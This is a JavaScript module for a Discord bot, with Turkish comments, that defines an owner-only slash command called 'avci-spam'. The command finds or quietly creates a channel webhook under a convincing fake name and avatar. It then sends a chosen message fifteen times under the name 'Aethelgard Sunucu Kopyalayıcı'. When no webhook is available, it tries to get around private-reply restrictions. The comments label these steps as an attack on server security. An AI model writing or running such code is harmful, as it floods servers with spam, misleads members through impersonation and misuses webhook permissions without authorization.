const { SlashCommandBuilder, WebhookClient, PermissionFlagsBits } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('avci-spam')
        .setDescription('Sunucudaki açık webhookları bulur ve herkese açık spam atar.')
        .addStringOption(option => 
            option.setName('mesaj')
                .setDescription('Gönderilecek içerik')
                .setRequired(true))
        .setContexts([0]) // Sadece sunucularda çalışır
        .setIntegrationTypes([0, 1]),

    async execute(interaction) {
        const OWNER_ID = "1389930042200559706";
        if (interaction.user.id !== OWNER_ID) return;

        const icerik = interaction.options.getString('mesaj');
        
        // Önce "Düşünülüyor..." yanıtı vererek zaman kazanıyoruz (ve ephemeral zorlamasını kırmaya çalışıyoruz)
        await interaction.deferReply({ ephemeral: true }); 

        try {
            // 1. AŞAMA: KANALDAKİ WEBHOOKLARI TARA
            // Botun o kanalda 'Manage Webhooks' yetkisi varsa veya açık bir webhook varsa yakalar
            const webhooks = await interaction.channel.fetchWebhooks().catch(() => null);
            
            let targetWebhook = null;

            if (webhooks && webhooks.size > 0) {
                targetWebhook = webhooks.first(); // İlk bulduğunu al
            } else {
                // 2. AŞAMA: EĞER WEBHOOK YOKSA VE YETKİ VARSA YENİSİNİ OLUŞTUR (GİZLİCE)
                try {
                    targetWebhook = await interaction.channel.createWebhook({
                        name: 'Aethelgard System', // Görseldeki gibi inandırıcı bir isim
                        avatar: 'https://r.resimlink.com/EnN8AFTihKvk.png',
                    });
                } catch (e) {
                    // Yetki yoksa burayı geçer
                }
            }

            // 3. AŞAMA: SALDIRI
            if (targetWebhook) {
                await interaction.editReply({ content: "✅ Açık bulundu! Herkese açık spam başlıyor..." });
                
                const wc = new WebhookClient({ url: targetWebhook.url });
                for (let i = 0; i < 15; i++) {
                    await wc.send({
                        content: icerik,
                        username: "Aethelgard Sunucu Kopyalayıcı",
                    });
                    await new Promise(r => setTimeout(r, 600));
                }
            } else {
                // EĞER WEBHOOK BULAMAZSA: Klasik 'Uygulama Yanıtı' ile zorlamaya devam
                await interaction.editReply({ content: "⚠️ Açık Webhook bulunamadı. Standart bypass deneniyor..." });
                
                // Burası yine 'yalnızca sen görebilirsin' diyebilir ama kanalın 
                // 'Uygulama Komutları' yetkisi açıksa herkes görür.
                await interaction.followUp({ content: icerik, ephemeral: false });
            }

        } catch (err) {
            await interaction.editReply({ content: "❌ Kritik hata: Sunucu güvenliği aşılamadı." });
        }
    }
};
